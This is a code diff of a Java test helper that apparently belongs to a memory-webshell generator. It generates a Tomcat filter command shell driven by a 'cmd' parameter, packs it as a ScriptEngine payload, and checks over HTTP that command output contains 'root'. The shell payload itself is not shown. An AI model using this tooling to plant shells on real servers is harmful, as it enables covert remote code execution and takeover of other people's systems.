@@ -5,17 +5,20 @@ import com.reajason.javaweb.config.CommandShellConfig;
 import com.reajason.javaweb.config.GenerateResult;
 import com.reajason.javaweb.config.Server;
 import com.reajason.javaweb.config.ShellTool;
-import com.reajason.javaweb.memsell.packer.JspPacker;
+import com.reajason.javaweb.memsell.packer.Packer;
+import com.reajason.javaweb.memsell.tomcat.TomcatShell;
 import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
+import net.bytebuddy.jar.asm.Opcodes;
 import okhttp3.HttpUrl;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
+import org.junit.jupiter.api.Test;
 
 import java.util.Objects;
 
-import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertTrue;
 
 /**
  * @author ReaJason
@@ -24,11 +27,16 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 @Slf4j
 public class CommandShellTool {
 
-    public static String generateJsp(Server server, CommandShellConfig config, String shellType, int targetJdkVersion) {
+    @Test
+    void testGenerate() {
+        String content = generate(Server.TOMCAT, CommandShellConfig.builder().paramName("cmd").build(), TomcatShell.JAKARTA_FILTER, Opcodes.V11, Packer.INSTANCE.ScriptEngine);
+        System.out.println(content);
+    }
+
+    public static String generate(Server server, CommandShellConfig config, String shellType, int targetJdkVersion, Packer.INSTANCE packer) {
         ShellTool shellTool = ShellTool.COMMAND;
         GenerateResult generateResult = GeneratorMain.generate(server, shellTool, shellType, config, targetJdkVersion);
-        JspPacker jspPacker = new JspPacker();
-        return new String(jspPacker.pack(generateResult));
+        return new String(packer.getPacker().pack(generateResult));
     }
 
     @SneakyThrows
@@ -44,7 +52,7 @@ public class CommandShellTool {
 
         try (Response response = okHttpClient.newCall(request).execute()) {
             String res = response.body().string();
-            assertEquals("root", res.trim());
+            assertTrue(res.contains("root"));
         }
     }
 }
